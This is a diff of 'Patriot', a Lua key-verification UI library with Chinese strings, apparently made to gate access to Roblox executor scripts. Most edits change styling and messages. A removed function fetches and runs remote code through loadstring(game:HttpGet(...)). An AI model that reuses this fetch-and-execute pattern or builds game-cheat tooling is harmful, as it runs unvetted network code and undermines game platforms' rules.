         local btnStroke = Instance.new("UIStroke", btn)
         btnStroke.Color = isPrimary and Patriot.Theme.AccentHover or Patriot.Theme.Accent
@@ -2125,7 +1719,7 @@ local function BuildKeyUI()
     userBtn.Text = ""
     userBtn.AutoButtonColor = false
     userBtn.Parent = mainFrame
-    Instance.new("UICorner", userBtn).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", userBtn).CornerRadius = UDim.new(0, 4)
 
     local userIcon = Instance.new("ImageLabel")
     userIcon.Size = UDim2.new(0, 18, 0, 18)
@@ -2148,7 +1742,7 @@ local function BuildKeyUI()
     discordBtn.Text = ""
     discordBtn.AutoButtonColor = false
     discordBtn.Parent = mainFrame
-    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 4)
 
     local discordIcon = Instance.new("ImageLabel")
     discordIcon.Size = UDim2.new(0, 18, 0, 18)
@@ -2171,7 +1765,7 @@ local function BuildKeyUI()
     changelogBtn.Text = ""
     changelogBtn.AutoButtonColor = false
     changelogBtn.Parent = mainFrame
-    Instance.new("UICorner", changelogBtn).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", changelogBtn).CornerRadius = UDim.new(0, 4)
 
     local changelogIcon = Instance.new("ImageLabel")
     changelogIcon.Size = UDim2.new(0, 18, 0, 18)
@@ -2212,7 +1806,7 @@ local function BuildKeyUI()
         shopFrame.Parent = mainFrame
 
         local shopCorner = Instance.new("UICorner", shopFrame)
-        shopCorner.CornerRadius = UDim.new(0, 12)
+        shopCorner.CornerRadius = UDim.new(0, 4)
 
         local shopTopFix = Instance.new("Frame")
         shopTopFix.Size = UDim2.new(1, 0, 0, 8)
@@ -2232,7 +1826,7 @@ local function BuildKeyUI()
         shopIconWrapper.BackgroundTransparency = 0.7
         shopIconWrapper.BorderSizePixel = 0
         shopIconWrapper.Parent = shopFrame
-        Instance.new("UICorner", shopIconWrapper).CornerRadius = UDim.new(0, 6)
+        Instance.new("UICorner", shopIconWrapper).CornerRadius = UDim.new(0, 4)
 
         local shopIconStroke = Instance.new("UIStroke", shopIconWrapper)
         shopIconStroke.Color = Patriot.Theme.Accent
@@ -2286,7 +1880,7 @@ local function BuildKeyUI()
         buyBtn.Text = ""
         buyBtn.AutoButtonColor = false
         buyBtn.Parent = shopFrame
-        Instance.new("UICorner", buyBtn).CornerRadius = UDim.new(0, 6)
+        Instance.new("UICorner", buyBtn).CornerRadius = UDim.new(0, 4)
 
         local buyBtnStroke = Instance.new("UIStroke", buyBtn)
         buyBtnStroke.Color = Patriot.Theme.AccentHover
@@ -2329,7 +1923,7 @@ local function BuildKeyUI()
         buyBtn.MouseButton1Click:Connect(function()
             if Patriot.Shop.Link ~= "" then
                 pcall(function() setclipboard(Patriot.Shop.Link) end)
-                Patriot:Notify("商店", "商店链接已复制到剪贴板！", 2, "copy")
+                Patriot:Notify("商店", "商店链接已复制到剪贴板", 2, "copy")
             end
         end)
     end
@@ -2346,18 +1940,18 @@ local function BuildKeyUI()
         if dotsThread then task.cancel(dotsThread) dotsThread = nil end
         local color, icon, text = Patriot.Theme.StatusIdle, getIcon("lock"), customText or "未检测到密钥"
         if state == "verifying" then
-            color, icon, text = Patriot.Theme.Accent, getIcon("loading"), "验证密钥中"
+            color, icon, text = Patriot.Theme.Accent, getIcon("loading"), "验证中"
             spinConnection = RunService.Heartbeat:Connect(function(dt)
                 if statusIcon and statusIcon.Parent then statusIcon.Rotation = (statusIcon.Rotation + dt * 360) % 360
                 else if spinConnection then spinConnection:Disconnect() end end
             end)
             local dots, i = {".", "..", "...", ""}, 1
             dotsThread = task.spawn(function()
-                while statusLabel and statusLabel.Parent and statusLabel.Text:find("验证密钥中", 1, true) do
+                while statusLabel and statusLabel.Parent and statusLabel.Text:find("验证中", 1, true) do
                     statusLabel.Text = text .. dots[i] i = (i % #dots) + 1 task.wait(0.4)
                 end
             end)
-        elseif state == "success" then color, icon, text = Patriot.Theme.Success, getIcon("check"), customText or "访问已授予"
+        elseif state == "success" then color, icon, text = Patriot.Theme.Success, getIcon("check"), customText or "验证成功"
         elseif state == "error" then color, icon, text = Patriot.Theme.Error, getIcon("alert"), customText or "无效密钥" end
         TweenService:Create(statusLabel, TweenInfo.new(0.3), {TextColor3 = color}):Play()
         TweenService:Create(statusIcon, TweenInfo.new(0.3), {ImageColor3 = color}):Play()
@@ -2371,7 +1965,7 @@ local function BuildKeyUI()
     end
 
     closeBtn.MouseButton1Click:Connect(function()
-        Patriot:Notify("再见", "欢迎下次使用！", 2, "close")
+        Patriot:Notify("再见", "欢迎下次使用", 2, "close")
         closeDoorsThenExit(function()
             fullCleanup()
             TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
@@ -2393,27 +1987,27 @@ local function BuildKeyUI()
                     valid = result.valid == true
                     local errMsgs = {
                         KEY_INVALID = "系统中未找到密钥", KEY_EXPIRED = "密钥已过期",
-                        HWID_BANNED = "硬件已被封禁", KEY_INVALIDATED = "密钥已被撤销",
+                        HWID_BANNED = "硬件被封禁", KEY_INVALIDATED = "密钥已被撤销",
                         ALREADY_USED = "一次性密钥已被使用", HWID_MISMATCH = "硬件ID不匹配",
                         SERVICE_NOT_FOUND = "服务未找到", SERVICE_MISMATCH = "服务不匹配",
                         PREMIUM_REQUIRED = "需要高级版", ERROR = "网络错误"
                     }
                     local errCode = result.error or "未知"
                     errorMsg = errMsgs[errCode] or result.message or errCode
-                    if errCode == "HWID_BANNED" then task.delay(2, function() cloneref(Players.LocalPlayer):Kick("硬件已被封禁") end) end
+                    if errCode == "HWID_BANNED" then task.delay(2, function() cloneref(Players.LocalPlayer):Kick("硬件被封禁") end) end
                 elseif type(result) == "boolean" then valid = result errorMsg = msg or "无效密钥" end
             end
         end
         redeemBtn.Active = true
         if valid then
             saveKey(key) getgenv().SCRIPT_KEY = key getgenv().PatriotLoaded = false
-            setStatus("success") Patriot:Notify("成功", "密钥验证成功！", 2, "success") task.wait(1)
+            setStatus("success") Patriot:Notify("成功", "密钥验证成功", 2, "success") task.wait(1)
             closeDoorsThenExit(function()
                 disableBlur()
                 TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
                 TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
                 task.wait(0.4) screenGui:Destroy()
-                if not Internal.IsJunkieMode and Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
+                if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
             end)
         else
             setStatus("error", errorMsg) Patriot:Notify("无效", errorMsg, 4, "error")
@@ -2423,11 +2017,11 @@ local function BuildKeyUI()
 
     redeemBtn.MouseButton1Click:Connect(handleRedeem)
     acquireBtn.MouseButton1Click:Connect(function()
-        if Patriot.Links.GetKey ~= "" then Patriot:Notify("已复制", "密钥链接已复制！", 3, "copy") pcall(function() setclipboard(Patriot.Links.GetKey) end)
+        if Patriot.Links.GetKey ~= "" then Patriot:Notify("已复制", "密钥链接已复制", 3, "copy") pcall(function() setclipboard(Patriot.Links.GetKey) end)
         else Patriot:Notify("错误", "未设置密钥链接", 3, "warning") end
     end)
     discordBtn.MouseButton1Click:Connect(function()
-        if Patriot.Links.Discord ~= "" then Patriot:Notify("Discord", "邀请链接已复制！", 2, "discord") pcall(function() setclipboard(Patriot.Links.Discord) end) end
+        if Patriot.Links.Discord ~= "" then Patriot:Notify("Discord", "邀请链接已复制", 2, "discord") pcall(function() setclipboard(Patriot.Links.Discord) end) end
     end)
     textBox.FocusLost:Connect(function(enter) if enter then handleRedeem() end end)
 
@@ -2439,89 +2033,27 @@ local function BuildKeyUI()
         ui.toggleUser(userIcon)
         if #Patriot.Changelog > 0 then task.wait(0.3) ui.toggleCL(changelogIcon) end
     end)
-    
-    -- 添加流动边框
-    addFlowingBorder(mainFrame, 16)
 end
 
 function Patriot:Launch()
-    Internal.IsJunkieMode = false
     Internal.ValidateFunction = Patriot.Callbacks.OnVerify
     local existingKey = getgenv().SCRIPT_KEY
     if existingKey and existingKey ~= "" then
-        if existingKey == "KEYLESS" then
-            Patriot:Notify("已执行", "脚本加载成功！", 2, "success")
-            if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
-        elseif Internal.ValidateFunction and validateKey(existingKey, Internal.ValidateFunction) then
-            Patriot:Notify("已执行", "脚本加载成功！", 2, "success")
+        if Internal.ValidateFunction and validateKey(existingKey, Internal.ValidateFunction) then
+            Patriot:Notify("已执行", "脚本加载成功", 2, "success")
             if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
         end
         getgenv().SCRIPT_KEY = nil
     end
     getgenv().PatriotClosed = false
     EnsureIconsReady(function()
-        if Patriot.Options.Keyless == true then
-            if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
-            BuildKeylessUI()
-            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
-            return
-        end
         if Patriot.Storage.AutoLoad and Internal.ValidateFunction then
             local savedKey = loadKey()
             if savedKey and savedKey ~= "" then
-                Patriot:Notify("检查中", "正在验证保存的密钥...", 2, "shield") task.wait(0.5)
+                Patriot:Notify("检查中", "验证保存的密钥...", 2, "shield") task.wait(0.5)
                 if validateKey(savedKey, Internal.ValidateFunction) then
                     getgenv().SCRIPT_KEY = savedKey
-                    Patriot:Notify("欢迎回来", "密钥验证成功！", 2, "success")
-                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
-                else clearKey() Patriot:Notify("已过期", "保存的密钥已失效", 3, "warning") task.wait(1) end
-            end
-        end
-        BuildKeyUI()
-        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
-    end)
-end
-
-function Patriot:LaunchJunkie(config)
-    assert(config and config.Service and config.Identifier and config.Provider, "需要配置: Service, Identifier, Provider")
-    Internal.IsJunkieMode = true
-    local existingKey = getgenv().SCRIPT_KEY
-    if existingKey and existingKey ~= "" then
-        Patriot:Notify("已执行", "脚本加载成功！", 2, "success")
-        if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
-    end
-    getgenv().PatriotClosed = false
-    EnsureIconsReady(function()
-        local success, Junkie = pcall(function() return loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))() end)
-        if not success or not Junkie then Patriot:Notify("错误", "加载Junkie SDK失败", 5, "error") return end
-        Junkie.service = config.Service
-        Junkie.identifier = config.Identifier
-        Junkie.provider = config.Provider
-        Internal.Junkie = Junkie
-        if Patriot.Links.GetKey == "" then pcall(function() Patriot.Links.GetKey = Junkie.get_key_link() end) end
-        Internal.ValidateFunction = function(key) return Junkie.check_key(key) end
-        if Patriot.Options.Keyless == nil then
-            local ks, kr = pcall(function() return Junkie.check_key("KEYLESS") end)
-            if ks and kr and kr.valid then
-                if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
-                BuildKeylessUI()
-                while not getgenv().SCRIPT_KEY do task.wait(0.1) end
-                return
-            end
-        elseif Patriot.Options.Keyless == true then
-            if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
-            BuildKeylessUI()
-            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
-            return
-        end
-        if Patriot.Storage.AutoLoad then
-            local savedKey = loadKey()
-            if savedKey and savedKey ~= "" then
-                Patriot:Notify("检查中", "正在验证保存的密钥...", 2, "shield") task.wait(0.5)
-                local vs, vr = pcall(function() return Junkie.check_key(savedKey) end)
-                if vs and vr and vr.valid then
-                    getgenv().SCRIPT_KEY = savedKey
-                    Patriot:Notify("欢迎回来", "密钥验证成功！", 2, "success")
+                    Patriot:Notify("欢迎回来", "密钥验证成功", 2, "success")
                     if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
                 else clearKey() Patriot:Notify("已过期", "保存的密钥已失效", 3, "warning") task.wait(1) end
             end
@@ -2536,25 +2068,3 @@ function Patriot:ClearSavedKey() return clearKey() end
 
 getgenv().Patriot = Patriot
 return Patriot
-
--- ========== 使用示例 ==========
--- 复制以下代码单独运行即可启动界面
-
-local Patriot = require(game:GetService("ReplicatedStorage"):WaitForChild("Patriot"))  -- 如果上面的代码直接执行，用下面这行
--- 或者直接执行上面代码后，运行：
-
--- 配置验证函数（示例）
-Patriot.Callbacks.OnVerify = function(key)
-    -- 这里写你的验证逻辑
-    -- 返回 true 表示有效，false 表示无效
-    return key == "123456"
-end
-
--- 配置成功后的回调
-Patriot.Callbacks.OnSuccess = function()
-    print("验证成功！正在加载脚本")
-    -- 在这里放你的脚本代码
-end
-
--- 启动界面
-Patriot:Launch()
